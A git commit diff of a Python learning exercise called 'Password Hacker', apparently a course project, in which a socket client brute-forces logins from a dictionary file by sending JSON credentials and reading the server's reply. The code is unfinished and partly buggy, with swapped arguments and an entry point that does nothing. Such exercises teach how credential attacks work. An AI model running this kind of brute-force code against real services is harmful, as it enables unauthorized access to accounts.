2b7ec855bc0f3ff563504e37c36a13d793e8f9b7
feztix <pan0v.s.s@yandex.ru>
2020-12-13 13:35:05 +0300

    Stage 3.1/5: Exception Happened

--- Password Hacker (1)/task/hacking/hack.py
+++ Password Hacker (1)/task/hacking/hack.py
@@ -1,13 +1,15 @@
 import argparse
 import itertools
 import socket
+import json
 
 
 class PasswordHacker:
     DICTIONARY = r"/home/feztix/documents/coding/python/basic_project/passwords.txt"
+    _DICTIONARY = r"/home/feztix/documents/coding/python/Password_Hacker/Password Hacker (1)/task/hacking/logins.txt"
 
     def __init__(self):
-        # For unpcak using args.Ip/Port/Message
+        # For unpack using args.Ip/Port/Message
         args = self.init_cli()
         self.establish_connection(args)
 
@@ -27,14 +29,6 @@ class PasswordHacker:
 
         # Execute the parse_args() method
         args = my_parser.parse_args()
-
-        # input_path = args.Path
-
-        # if not os.path.isdir(input_path):
-        #     print('The path specified does not exist')
-        #     sys.exit()
-        #
-        # print('\n'.join(os.listdir(input_path)))
         return args
 
     def establish_connection(self, args):
@@ -45,27 +39,36 @@ class PasswordHacker:
 
             client_socket.connect(address)
 
-            # data = args.Message
-            # data = data.encode()
-
             password_generator = self.password_generator()
-            self.bruteforce(password_generator, client_socket)
+            login_generator = self.login_generator()
+            self.bruteforce(password_generator, login_generator, client_socket)
+            
+    # Send custom credentials
+    def send_credentials(self, login, password, client_socket):
+        # client_socket.send(password.encode())
+        # response = client_socket.recv(1024)
+        # response = response.decode()
+        # if response == "Connection success!":
+        #     print(password)
+        #     return False
 
-            # client_socket.send(data)
-            #
-            # response = client_socket.recv(1024)
-            # response = response.decode()
-            # print(response)
+        data = json.dumps({"login": login, "password": password})
+        client_socket.send(data.encode())
+        response = client_socket.recv(1024)
+        response = json.loads(response.decode()).get("result")
+        return data, response
 
     # Call custom generator
-    def bruteforce(self, gen_password, client_socket):
+    def bruteforce(self, gen_password, gen_login, client_socket):
         while True:
-            password = next(gen_password)
-            client_socket.send(password.encode())
-            response = client_socket.recv(1024)
-            response = response.decode()
-            if response == "Connection success!":
-                print(password)
+            # password = next(gen_password)
+            password = ""
+            login = next(gen_login)
+            self.send_credentials(password, login, client_socket)
+
+            data, resp = self.send_credentials(login, password, client_socket)
+            print(data, resp)
+            if resp != "Wrong login!":
                 break
 
     # Custom generator
@@ -77,9 +80,31 @@ class PasswordHacker:
                             *([letter.lower(), letter.upper()] for letter in passwd_on_line.strip("\n"))):
                         yield "".join(var)
 
+    def login_generator(self):
+        with open(PasswordHacker._DICTIONARY, 'r') as file:
+            for login_on_line in file:
+                # if not login_on_line.isdigit():
+                    # for var in itertools.product(
+                            # *([letter.lower(), letter.upper()] for letter in login_on_line.strip("\n"))):
+                        # yield "".join(var)
+                yield "".join(login_on_line.strip("\n"))
+
     def init(self):
         pass
 
 
 if __name__ == "__main__":
     PasswordHacker().init()
+
+
+
+# # Custom generator
+#     def password_generator(self, max_length=10):
+#         # Set Complexity
+#         lowercase = list(string.ascii_lowercase)
+#         digits = list(string.digits)
+#
+#         for i in range(1, max_length):
+#             complexity = itertools.chain(lowercase, digits)
+#             for passwd in itertools.product(complexity, repeat=i):
+#                 yield "".join(passwd)
